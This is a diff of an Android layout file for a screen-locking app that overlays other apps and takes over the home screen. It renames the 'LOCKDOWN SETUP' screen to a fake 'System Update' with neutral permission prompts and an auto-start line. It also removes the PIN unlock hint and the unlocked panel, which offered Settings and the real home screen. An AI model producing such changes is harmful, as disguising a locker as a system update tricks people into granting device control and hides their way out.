@@ -15,17 +15,25 @@
         <TextView
             android:layout_width="wrap_content"
             android:layout_height="wrap_content"
-            android:text="LOCKDOWN SETUP"
+            android:text="System Update"
             android:textColor="#FFFFFF"
             android:textSize="22sp"
             android:textStyle="bold" />
+
+        <TextView
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:layout_marginTop="6dp"
+            android:text="Required permissions"
+            android:textColor="#9090A0"
+            android:textSize="13sp" />
 
         <TextView
             android:id="@+id/warn"
             android:layout_width="match_parent"
             android:layout_height="wrap_content"
             android:layout_marginTop="8dp"
-            android:text="1) Display over other apps permission එක අනිවාර්යයි"
+            android:text="Display over other apps — required"
             android:textColor="#FF8080"
             android:textSize="13sp" />
 
@@ -34,28 +42,28 @@
             android:layout_width="match_parent"
             android:layout_height="wrap_content"
             android:layout_marginTop="20dp"
-            android:text="1. Overlay permission දෙන්න" />
+            android:text="Allow display over other apps" />
 
         <Button
             android:id="@+id/btnHome"
             android:layout_width="match_parent"
             android:layout_height="wrap_content"
-            android:text="2. Default Home app කරන්න" />
+            android:text="Set as default home app" />
 
         <Button
             android:id="@+id/btnLock"
             android:layout_width="match_parent"
             android:layout_height="wrap_content"
             android:layout_marginTop="24dp"
-            android:text="LOCK NOW" />
+            android:text="Start" />
 
         <TextView
             android:layout_width="match_parent"
             android:layout_height="wrap_content"
             android:layout_marginTop="16dp"
-            android:text="Unlock: clock එක තත්පර 3ක් long-press → PIN"
-            android:textColor="#9090A0"
-            android:textSize="12sp" />
+            android:text="Starts automatically once permission is granted"
+            android:textColor="#606070"
+            android:textSize="11sp" />
     </LinearLayout>
 
     <LinearLayout
@@ -65,33 +73,5 @@
         android:layout_gravity="center"
         android:orientation="vertical"
         android:padding="28dp"
-        android:visibility="gone">
-
-        <TextView
-            android:layout_width="wrap_content"
-            android:layout_height="wrap_content"
-            android:text="UNLOCKED"
-            android:textColor="#FFFFFF"
-            android:textSize="22sp"
-            android:textStyle="bold" />
-
-        <Button
-            android:id="@+id/btnSettings"
-            android:layout_width="match_parent"
-            android:layout_height="wrap_content"
-            android:layout_marginTop="20dp"
-            android:text="Open Settings" />
-
-        <Button
-            android:id="@+id/btnLauncher"
-            android:layout_width="match_parent"
-            android:layout_height="wrap_content"
-            android:text="Open real home screen" />
-
-        <Button
-            android:id="@+id/btnRelock"
-            android:layout_width="match_parent"
-            android:layout_height="wrap_content"
-            android:text="Lock again" />
-    </LinearLayout>
+        android:visibility="gone" />
 </FrameLayout>
